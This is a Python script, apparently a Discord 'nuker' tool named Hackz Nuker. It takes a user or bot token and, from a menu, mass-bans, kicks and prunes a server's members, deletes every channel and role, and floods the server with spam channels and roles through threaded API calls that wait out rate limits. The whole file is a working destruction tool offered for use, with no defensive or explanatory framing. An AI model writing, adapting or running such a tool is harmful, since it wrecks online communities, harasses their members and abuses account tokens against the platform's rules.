# by naif
import requests
import os
import sys
import threading
import time
import json
import asyncio
import discord
import aiohttp
from discord import Webhook
from discord.ext import commands

# Try to import pypresence, if not available, Rich Presence will be disabled
try:
    from pypresence import Presence
    PYPRESENCE_AVAILABLE = True
except ImportError:
    PYPRESENCE_AVAILABLE = False

os.system('cls & mode 85,20 & title Hackz Nuker - Settings')
token = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Token \x1b[38;5;15m> ')
rich_presence = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mWant Rich Presence\x1b[38;5;15m?\n     \x1b[38;5;184mType \x1b[38;5;15m"\x1b[38;5;184mY\x1b[38;5;15m" \x1b[38;5;184mfor Yes or \x1b[38;5;15m"\x1b[38;5;184mN\x1b[38;5;15m" \x1b[38;5;184mfor No \x1b[38;5;15m> ')
os.system('cls')

def check_token():
    try:
        response = requests.get('https://discord.com/api/v10/users/@me', headers={'Authorization': f'{token}'})
        if response.status_code == 200:
            return 'user'
        return 'bot'
    except:
        return 'invalid'

def RichPresence():
    if rich_presence.lower() == 'y':
        if PYPRESENCE_AVAILABLE:
            try:
                RPC = Presence('860799337365372978')
                RPC.connect()
                RPC.update(details='Coded by - ° TheyCallMeFree†#6969', large_image='free7', small_image='free7', large_text='Connected to Hackz Nuker', start=time.time())
                print(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mRich Presence Enabled\x1b[38;5;15m!')
            except Exception as e:
                print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mRich Presence Error: {e}\x1b[38;5;15m')
        else:
            print(' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mRich Presence not available (pypresence not installed)\x1b[38;5;15m')

rich_presence = RichPresence()
token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == 'user':
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix='$', case_insensitive=False, intents=intents)
elif token_type == 'bot':
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix='$', case_insensitive=False, intents=intents)
else:
    print(' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mInvalid Token\x1b[38;5;15m!')
    input()
    os._exit(1)

client.remove_command('help')

class Hackz:

    def BanMembers(self, guild, member):
        try:
            while True:
                r = requests.put(f'https://discord.com/api/v10/guilds/{guild}/bans/{member.strip()}', headers=headers)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                    continue
                break
            if r.status_code in [200, 201, 204]:
                print(f' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mSuccessfully Banned \x1b[38;5;15m=> {member.strip()}')
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError Banning {member.strip()}: {e}\x1b[38;5;15m')

    def KickMembers(self, guild, member):
        try:
            while True:
                r = requests.delete(f'https://discord.com/api/v10/guilds/{guild}/members/{member.strip()}', headers=headers)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                    continue
                break
            if r.status_code in [200, 201, 204]:
                print(f' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mSuccessfully Kicked \x1b[38;5;15m=> {member.strip()}')
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError Kicking {member.strip()}: {e}\x1b[38;5;15m')

    def DeleteChannels(self, guild, channel):
        try:
            while True:
                r = requests.delete(f'https://discord.com/api/v10/channels/{channel.strip()}', headers=headers)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                    continue
                break
            if r.status_code in [200, 201, 204]:
                print(f' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mSuccessfully Deleted Channel \x1b[38;5;15m=> {channel.strip()}')
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError Deleting Channel {channel.strip()}: {e}\x1b[38;5;15m')

    def DeleteRoles(self, guild, role):
        try:
            while True:
                r = requests.delete(f'https://discord.com/api/v10/guilds/{guild}/roles/{role.strip()}', headers=headers)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                    continue
                break
            if r.status_code in [200, 201, 204]:
                print(f' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mSuccessfully Deleted Role \x1b[38;5;15m=> {role.strip()}')
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError Deleting Role {role.strip()}: {e}\x1b[38;5;15m')

    def SpamChannels(self, guild, name):
        try:
            while True:
                json_data = {'name': name, 'type': 0}
                r = requests.post(f'https://discord.com/api/v10/guilds/{guild}/channels', headers=headers, json=json_data)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                    continue
                break
            if r.status_code in [200, 201, 204]:
                print(f' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mSuccessfully Created Channel \x1b[38;5;15m=> {name}')
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError Creating Channel {name}: {e}\x1b[38;5;15m')

    def SpamRoles(self, guild, name):
        try:
            while True:
                json_data = {'name': name}
                r = requests.post(f'https://discord.com/api/v10/guilds/{guild}/roles', headers=headers, json=json_data)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                    continue
                break
            if r.status_code in [200, 201, 204]:
                print(f' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mSuccessfully Created Role \x1b[38;5;15m=> {name}')
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError Creating Role {name}: {e}\x1b[38;5;15m')

    async def Scrape(self):
        try:
            guild = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Server ID to Scrape \x1b[38;5;15m> ')
            await client.wait_until_ready()
            guildOBJ = client.get_guild(int(guild))
            if not guildOBJ:
                print(' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mGuild not found\x1b[38;5;15m!')
                return
            
            # Create Scraped directory if it doesn't exist
            os.makedirs('Scraped', exist_ok=True)
            
            # Remove existing files
            for file in ['Scraped/members.txt', 'Scraped/channels.txt', 'Scraped/roles.txt']:
                try:
                    os.remove(file)
                except:
                    pass
            
            # Scrape members
            membercount = 0
            with open('Scraped/members.txt', 'a', encoding='utf-8') as m:
                for member in guildOBJ.members:
                    m.write(str(member.id) + '\n')
                    membercount += 1
                print(f'\n \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mSuccessfully Scraped \x1b[38;5;15m=\x1b[38;5;184m> {membercount} Members\x1b[38;5;15m!')
            
            # Scrape channels
            channelcount = 0
            with open('Scraped/channels.txt', 'a', encoding='utf-8') as c:
                for channel in guildOBJ.channels:
                    c.write(str(channel.id) + '\n')
                    channelcount += 1
                print(f' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mSuccessfully Scraped \x1b[38;5;15m=\x1b[38;5;184m> {channelcount} Channels\x1b[38;5;15m!')
            
            # Scrape roles
            rolecount = 0
            with open('Scraped/roles.txt', 'a', encoding='utf-8') as r:
                for role in guildOBJ.roles:
                    r.write(str(role.id) + '\n')
                    rolecount += 1
                print(f' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mSuccessfully Scraped \x1b[38;5;15m=\x1b[38;5;184m> {rolecount} Roles\x1b[38;5;15m!')
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError during scraping: {e}\x1b[38;5;15m')

    async def NukeExecute(self):
        try:
            guild = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Server ID \x1b[38;5;15m> ')
            channel_name = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Channel Names \x1b[38;5;15m> ')
            channel_amount = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Channel Amount \x1b[38;5;15m> ')
            role_name = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Role Names \x1b[38;5;15m> ')
            role_amount = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Role Amount \x1b[38;5;15m> ')
            print()
            
            # Read scraped data
            try:
                with open('Scraped/members.txt', 'r') as f:
                    members = f.readlines()
                with open('Scraped/channels.txt', 'r') as f:
                    channels = f.readlines()
                with open('Scraped/roles.txt', 'r') as f:
                    roles = f.readlines()
            except FileNotFoundError:
                print(' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mScraped files not found. Please scrape first.\x1b[38;5;15m')
                return
            
            # Execute nuke operations
            for member in members:
                threading.Thread(target=self.BanMembers, args=(guild, member)).start()
            for channel in channels:
                threading.Thread(target=self.DeleteChannels, args=(guild, channel)).start()
            for role in roles:
                threading.Thread(target=self.DeleteRoles, args=(guild, role)).start()
            for i in range(int(channel_amount)):
                threading.Thread(target=self.SpamChannels, args=(guild, channel_name)).start()
            for i in range(int(role_amount)):
                threading.Thread(target=self.SpamRoles, args=(guild, role_name)).start()
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError during nuke: {e}\x1b[38;5;15m')

    async def BanExecute(self):
        try:
            guild = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Server ID \x1b[38;5;15m> ')
            print()
            try:
                with open('Scraped/members.txt', 'r') as f:
                    members = f.readlines()
                for member in members:
                    threading.Thread(target=self.BanMembers, args=(guild, member)).start()
            except FileNotFoundError:
                print(' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mMembers file not found. Please scrape first.\x1b[38;5;15m')
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError during ban: {e}\x1b[38;5;15m')

    async def KickExecute(self):
        try:
            guild = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Server ID \x1b[38;5;15m> ')
            print()
            try:
                with open('Scraped/members.txt', 'r') as f:
                    members = f.readlines()
                for member in members:
                    threading.Thread(target=self.KickMembers, args=(guild, member)).start()
            except FileNotFoundError:
                print(' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mMembers file not found. Please scrape first.\x1b[38;5;15m')
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError during kick: {e}\x1b[38;5;15m')

    async def ChannelDeleteExecute(self):
        try:
            guild = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Server ID \x1b[38;5;15m> ')
            print()
            try:
                with open('Scraped/channels.txt', 'r') as f:
                    channels = f.readlines()
                for channel in channels:
                    threading.Thread(target=self.DeleteChannels, args=(guild, channel)).start()
            except FileNotFoundError:
                print(' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mChannels file not found. Please scrape first.\x1b[38;5;15m')
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError during channel deletion: {e}\x1b[38;5;15m')

    async def RoleDeleteExecute(self):
        try:
            guild = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Server ID \x1b[38;5;15m> ')
            print()
            try:
                with open('Scraped/roles.txt', 'r') as f:
                    roles = f.readlines()
                for role in roles:
                    threading.Thread(target=self.DeleteRoles, args=(guild, role)).start()
            except FileNotFoundError:
                print(' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mRoles file not found. Please scrape first.\x1b[38;5;15m')
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError during role deletion: {e}\x1b[38;5;15m')

    async def ChannelSpamExecute(self):
        try:
            guild = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Server ID \x1b[38;5;15m> ')
            name = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Channel Names \x1b[38;5;15m> ')
            amount = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Channel Amount \x1b[38;5;15m> ')
            print()
            for i in range(int(amount)):
                threading.Thread(target=self.SpamChannels, args=(guild, name)).start()
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError during channel spam: {e}\x1b[38;5;15m')

    async def RoleSpamExecute(self):
        try:
            guild = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Server ID \x1b[38;5;15m> ')
            name = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Role Names \x1b[38;5;15m> ')
            amount = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Role Amount \x1b[38;5;15m> ')
            print()
            for i in range(int(amount)):
                threading.Thread(target=self.SpamRoles, args=(guild, name)).start()
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError during role spam: {e}\x1b[38;5;15m')

    async def PruneMembers(self):
        try:
            guild_id = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter Server ID \x1b[38;5;15m> ')
            print()
            await client.wait_until_ready()
            guild = client.get_guild(int(guild_id))
            if guild:
                try:
                    await guild.prune_members(days=1, compute_prune_count=False)
                    print(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mPrune operation completed\x1b[38;5;15m!')
                except Exception as e:
                    print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mPrune operation failed: {e}\x1b[38;5;15m')
            else:
                print(' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mGuild not found\x1b[38;5;15m!')
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError during prune: {e}\x1b[38;5;15m')

    async def Menu(self):
        os.system(f'cls & mode 85,20 & title Hackz Nuker - Connected as {client.user}')
        print('\n \x1b[38;5;184m╔═══════════════════════╗ ╦ ╦╔═╗╔═╗╦╔═╔═╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗\n \x1b[38;5;184m║ \x1b[38;5;15m[\x1b[38;5;184m1\x1b[38;5;15m] \x1b[38;5;184mBan Members       ║ \x1b[38;5;103m╠═╣╠═╣║  ╠╩╗╔═╝  ║║║║ ║╠╩╗║╣ ╠╦╝\n \x1b[38;5;184m║ \x1b[38;5;15m[\x1b[38;5;184m2\x1b[38;5;15m] \x1b[38;5;184mKick Members      ║ \x1b[38;5;15m╩ ╩╩ ╩╚═╝╩ ╩╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═\n \x1b[38;5;184m║ \x1b[38;5;15m[\x1b[38;5;184m3\x1b[38;5;15m] \x1b[38;5;184mPrune Members     ║════════════════════════════════╗\n \x1b[38;5;184m║ \x1b[38;5;15m[\x1b[38;5;184m4\x1b[38;5;15m] \x1b[38;5;184mDelete Roles      ║ \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mDiscord \x1b[38;5;15m: \x1b[38;5;184mdiscord.gg/hackz ║═══╗\n \x1b[38;5;184m║ \x1b[38;5;15m[\x1b[38;5;184m5\x1b[38;5;15m] \x1b[38;5;184mDelete Channels   ║════════════════════════════════╝   ║\n \x1b[38;5;184m║ \x1b[38;5;15m[\x1b[38;5;184m6\x1b[38;5;15m] \x1b[38;5;184mCreate Roles      ║ \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mCoder \x1b[38;5;15m: \x1b[38;5;184m° TheyCallMeFree†#6969 ║\n \x1b[38;5;184m║ \x1b[38;5;15m[\x1b[38;5;184m7\x1b[38;5;15m] \x1b[38;5;184mCreate Channels   ║══════════════════════════════╗     ║\n \x1b[38;5;184m║ \x1b[38;5;15m[\x1b[38;5;184m8\x1b[38;5;15m] \x1b[38;5;184mNuke Server       ║ \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mYoutube \x1b[38;5;15m: \x1b[38;5;184mTheyCallMeFree ║═════╝\n \x1b[38;5;184m║ \x1b[38;5;15m[\x1b[38;5;184m9\x1b[38;5;15m] \x1b[38;5;184mScrape Info       ║══════════════════════════════╝\n \x1b[38;5;184m║ \x1b[38;5;15m[\x1b[38;5;184me\x1b[38;5;15m] \x1b[38;5;184mExit              ║\n \x1b[38;5;184m╚═══════════════════════╝\n ')
        choice = input(' \x1b[38;5;15m[\x1b[38;5;184m$\x1b[38;5;15m] \x1b[38;5;184mEnter \x1b[38;5;15m> ')
        if choice == '1':
            await self.BanExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '2':
            await self.KickExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '3':
            await self.PruneMembers()
            time.sleep(2)
            await self.Menu()
        elif choice == '4':
            await self.RoleDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '5':
            await self.ChannelDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '6':
            await self.RoleSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '7':
            await self.ChannelSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '8':
            await self.NukeExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '9':
            await self.Scrape()
            time.sleep(3)
            await self.Menu()
        elif choice.lower() == 'e':
            os._exit(0)

    @client.event
    async def on_ready():
        await Hackz().Menu()

    def Startup(self):
        try:
            client.run(token)
        except Exception as e:
            print(f' \x1b[38;5;15m[\x1b[38;5;196m$\x1b[38;5;15m] \x1b[38;5;196mError: {e}\x1b[38;5;15m')
            input()
            os._exit(2)

if __name__ == '__main__':
    Hackz().Startup()